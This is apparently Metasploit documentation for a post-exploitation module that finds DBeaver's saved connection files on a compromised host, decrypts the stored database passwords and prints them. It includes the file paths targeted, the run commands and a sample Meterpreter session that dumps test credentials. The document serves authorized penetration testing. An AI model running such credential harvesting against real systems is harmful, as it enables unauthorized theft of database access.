## Vulnerable Application
  DBeaver is free and open source universal database tool for developers and database administrators.

  This module will determine if Dbeaver is installed on the target system and, if it is, it will try to
  dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
  where possible.

  Any Dbeaver version on any operating system are supported.

  If it works normally, the connection name, host, username and password saved in the certificate file will be printed

### Installation Steps

  1. Download and run the Dbeaver installer (https://dbeaver.io/files/). Since
     the encryption algorithm changed in version 6.1.3, it is recommended to
     test this module against a version below 6.1.3 and also against the latest
     version.
  2. Select default installation
  3. Open the software and create a database connection
     complete password setting, add the test account password to the certificate.

## Verification Steps

  1. Get a session.
  2. Do: `set session <session number>`
  3. Do: `run post/multi/gather/credentials/dbeaver`
  4. If the system has registry keys for Dbeaver passwords they will be printed out.

## Options

 **XML_FILE_PATH**

Specify an XML configuration file (eg.
`C:\Users\FireEye\.dbeaver4\General\.dbeaver-data-sources.xml` or
`C:\Users\FireEye\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver-data-sources.xml`).

 **JSON_DIR_PATH**

Specifies the config dir path for Dbeaver. Ensure that there are two files
`credentials-config.json` and `data-sources.json` under the directory (eg.
`"C:\Users\FireEye\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver`).

## Scenarios

```
meterpreter > run post/windows/gather/credentials/dbeaver

[*] Gather Dbeaver Passwords on FireEye
[+] dbeaver .dbeaver-data-sources.xml saved to /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_dbeaver.creds_319751.txt
[*] Finished processing C:\Users\FireEye\.dbeaver4\General\.dbeaver-data-sources.xml
[+] dbeaver credentials-config.json saved to /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_dbeaver.creds_334807.txt
[+] dbeaver data-sources.json saved to /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_dbeaver.creds_309767.txt
[*] Finished processing C:\Users\FireEye\AppData\Roaming\DBeaverData\workspace6\General\.dbeaver
[+] Passwords stored in: /home/kali-team/.msf4/loot/20221205145256_default_172.16.153.128_host.dbeaver_421133.txt
[+] Dbeaver Password
================

Name             Protocol    Hostname   Port  Username  Password        DB        URI                                        Type
----             --------    --------   ----  --------  --------        --        ---                                        ----
Test_MYSQL       mysql       localhost  3306  root      test_password   db        jdbc:mysql://localhost:3306/db             dev
Test_PostgreSQL  postgresql  localhost  5432  postgres  test_passwordr  postgres  jdbc:postgresql://localhost:5432/postgres  dev
localhost        mysql       localhost  3306  root      test_mysql      db        jdbc:mysql://localhost:3306/db             test
postgres         postgresql  localhost  5432  postgres  test_postgres   postgres  jdbc:postgresql://localhost:5432/postgres  prod

meterpreter >
```
